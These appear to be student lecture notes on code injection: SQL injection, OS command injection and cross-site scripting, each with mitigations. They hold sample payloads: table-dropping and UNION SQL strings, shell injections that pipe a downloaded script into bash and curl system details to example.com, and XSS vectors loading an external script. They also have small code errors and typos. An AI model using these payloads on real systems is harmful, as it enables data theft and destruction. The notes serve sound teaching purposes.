
**[Week 5 slides](https://modules.lancaster.ac.uk/pluginfile.php/3929559/course/section/462271/5%20Code%20Injection.pdf)**

## Code injection and Execution

- code injection - malicious code is injected into an application which is then interpreted or executed

- Attacks classed as code injection or arbitrary code execution

- Code injection attacks will require an element of execution

- execution attacks typically allow arbitrary code to be executed, possibly remotely 


### SQL Injection:

What's wrong with this code?

``` python
import squlite3
con = sqlite3.connect("example.db")
cur = con.cursor()
name = input("Please provide a name:")
result = cur.execute(f"SELECT * FROM users WHERE name='{name}'")
```

#### Availability Loss


`SELECT * FROM users WHERE 'name' = '$name'`

- if the input variable $name is not sanitized, **then a subsequent command could be executed**

`$name = "Bob'; DROP TABLE users; --`
`SELECT * FROM users WHERE 'name'='Bob'; DROP TABLE 
`users; --'`

#### Confidentiality Loss

`SELECT * FROM users WHERE 'name' = '$name'`

- if the unput variable $name is not sanitized, **then multiple rows can be obtained from the database**

##### Confidentiality Loss (Alternative)

`SELECT name, password FROM users WHERE 'name' = '$name'`

`$name = "' UNION SELECT a, b FROM sensitive_data;--"


```mysql 
SELECT name, password FROM users WHERE 'name' = '' UNION`
SELECT a, b FROM sensitive_data;--`
```
##### Integrity Loss

``` mysql
SELECT * FROM users WHERE 'name' = '$name'
``````


- if the input variable $name is not sanitized, **then a subsequent command could be executed**

``` mysql
SELECT * FROM users WHERE 'name' = 'Bob';
INSERT ('Eve') INTO users; --'
```

``` mysql
SELECT * FROM users WHERE 'name' = 'Bob';
UPDATE users SET 'name' = 'Eve';--
```


### Extracting useful information

- Databases typically have metadata stored about the tables they contain

``` mysql
DESCRIBE users;
SHOW COLUMNS FROM users;
```

- Databases will have tables with metadata in
	- `information_schema.tables` - what are the names of the tables
	- `information_schema.columns` - what columns do the tables have?
- What is the schema of `informtion_schema?` Read the documentation


##### Be mindful of database vendors

- Different database vendors have slightly different SQL syntax they use 
- Comments

``` mysql
-- (Microsoft SQL Server, PostgreSQL, MySQL, SQLite, Oracle)
# (MySQL, MaraiaDB)
```

- database metadata 
	- different vendors may structure metadata differently

### Mitigation - Prepared/Parametrised Statements

- do not trust any user provided input - assume that it may be in an intentionally malicious format
- use prepared statements to separate the SQL logic and the data inputs to the query
	- Specify the query and locations in the query where data will be provided
	- provide data to the query
- Do not combine the two and use a query with data embedded in it
- Different databases / languages / libraries have different APIs
- 
![[Pasted image 20250213120406.png]]


## OS Command Injection Shell Injection

### Executing Commands

- an application may need to execute an application on a shell
- e.g., a website that offers image/video transcoding services might use ffmpeg

``` python
#!/bin/bash
$1 ="Video"
ffmpeg -i $1.avi output.mp4
```

### Remote code execution 

``` python
#!/bin/bash
$1 ="Video ; $(wget hhtps://example.com/script.hs | bash) ; echo "
ffmpeg -i $1.avi output.mp4
```

- use similar technique to SQL injection to inject a command into the shell
- command separators:
	- & (Background Execution)
	- && (Logic AND)
	- | (Pipe)
	- || (Logic OR)
	- ; (Command Separator)
	- \n (Newline)


#### Exfiltrate System Information
```python
#!/bin/bash
$1 = "video ; $(
	curl -X POST
		 -H "Content-Type: application/json"
		 -d {'uname':'$(uname -a)'} https://example.com/) ; exho "
ffmpeg -i $1.avi output.mp4
```

- post information on the machine to a website
- Other approaches to do this (ping, nslookup)

### Mitigation

- do not use the user input on the shell
- Alternative: Only allow user input that cannot inject a command
	- E.g., numeric input


## Cross Site Scripting (XSS)


### Persistent XSS

- Similar to both previous attacks
	- Adversary provides malicious input to a website that stores it
	- The website then displays this content to other users
- Example of persistent XSS: Posting a tweet / sending a message on facebook /....


### Attack Vectors

``` html
<script src="https://example.com/bad.js">
```

- this injects an external JavaScript file (bad.js) from a malicious server (https://example.com) into the web page

- When the page loads, the browser fetches and executes the malicious script from the external server

- The script can steal sensitive information (e.g., cookies, session tokens).
- it can redirect users to malicious websites or perform actions on behalf of the user

### Attack Vectors

```html
<div onmouseover ="alert('xss')"></div>
```

- this inject a malicious event handler (onmouseover) into HTML element
- when the user hovers over the `<div>`, the onmouseover event triggers the alert ('xss') JavaScript code.
- The attacker can replace the alert ('xss') with malicious code to steal data or preform unauthorized actions

### Attack Vectors

```html
<img src="http://this.does.not.exist/img" onerror=alert('xss') />
```

- this inject an image tag with a malicious onerror event handler
- the src attribute points to a non-existent image (http://this.does.not.exist/img).
- When the browser fails to load the image, the onerror event triggers alert('xss') JavaScript code
- The attacker can replace alert('xss') with malicious code to execute arbitrary JavaScript
### Attack Vectors
```html
<img src=j&#41vascript:alert('xss')>
```




### Attack Vectors

``` Javascript
body {
	background:url("javascript:alert('XSS')");
}
```

- this inject malicious javascript into a CSS background property
- the background:url("Javascript:alert('XSS')"); rule attemts to execute JavaScipt when the CSS is parsed
- if successful, the attacker can execute arbitrary JavaScript

### Persistent XSS Mitigation

- consider all input provided by users to be untrusted
- Sanitise all untrusted input before using it 
	- E.g., with https://www.php.net/manual/en/function.htmlentities.php
	- Avoid JavaScript urls


### Reflected XSS

- different to persistent XSS

- Persistent XSS: Adversary provides malicious code to server, which presents it to other users

- Reflected XSS: User clicks a malicious link with attack encoded into it, which injects the attack into the visited website

### DOM based XSS

- DOM based XSS: Adversary injects attacks into running application

```JavaScript
document.write("...<script>alert('xss')</script>...")
```